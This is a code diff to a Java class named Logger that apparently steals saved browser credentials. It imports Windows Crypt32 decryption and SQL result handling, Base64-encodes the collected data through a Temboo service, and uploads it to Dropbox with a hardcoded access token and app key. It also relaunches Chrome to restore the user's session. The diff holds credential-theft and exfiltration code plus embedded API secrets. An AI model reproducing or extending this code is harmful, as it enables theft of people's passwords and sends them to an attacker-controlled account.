@@ -7,12 +7,14 @@ import java.sql.ResultSet;
 import java.sql.SQLException;
 import java.sql.Statement;
 import java.util.ArrayList;
-import java.util.Base64;
 
 import com.sun.jna.platform.win32.Crypt32Util;
 import com.temboo.Library.Dropbox.FilesAndMetadata.UploadFile;
 import com.temboo.Library.Dropbox.FilesAndMetadata.UploadFile.UploadFileInputSet;
 import com.temboo.Library.Dropbox.FilesAndMetadata.UploadFile.UploadFileResultSet;
+import com.temboo.Library.Utilities.Encoding.Base64Encode;
+import com.temboo.Library.Utilities.Encoding.Base64Encode.Base64EncodeInputSet;
+import com.temboo.Library.Utilities.Encoding.Base64Encode.Base64EncodeResultSet;
 import com.temboo.core.TembooException;
 import com.temboo.core.TembooSession;
 
@@ -145,8 +147,21 @@ public class Logger {
 		// Get an InputSet object for the choreo
 		UploadFileInputSet uploadFileInputs = uploadFileChoreo.newInputSet();
 		// Set inputs
+		// Instantiate the Choreo, using a previously instantiated TembooSession object, eg:
+		// TembooSession session = new TembooSession("logger", "myFirstApp", "N5LS8WVzNyNEKSDrXLVWNFL3nlypo7vr");
+		Base64Encode base64EncodeChoreo = new Base64Encode(session);
+
+		// Get an InputSet object for the choreo
+		Base64EncodeInputSet base64EncodeInputs = base64EncodeChoreo.newInputSet();
+
+		// Set inputs
+		base64EncodeInputs.set_Text(info);
+
+		// Execute Choreo
+		Base64EncodeResultSet base64EncodeResults = base64EncodeChoreo.execute(base64EncodeInputs);
+
 		uploadFileInputs.set_ResponseFormat("json");
-		uploadFileInputs.set_FileContents(Base64.getEncoder().encodeToString(info.getBytes()));
+		uploadFileInputs.set_FileContents(base64EncodeResults.toString());
 		uploadFileInputs.set_Root("sandbox");
 		uploadFileInputs.set_AccessToken("jvm9xp5ea4kuk06g");
 		uploadFileInputs.set_AppKey("bwr2bxarafudtxj");
@@ -170,7 +185,7 @@ public class Logger {
 	
 	public static void openChrome(){
 		try {
-		    Process p = Runtime.getRuntime().exec("/Program Files (x86)/Google/Chrome/Application/chrome.exe --restore-last-session");
+		    Process p = Runtime.getRuntime().exec("C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe --restore-last-session");
 		} catch (Exception e) {
 		    e.printStackTrace();
 		}
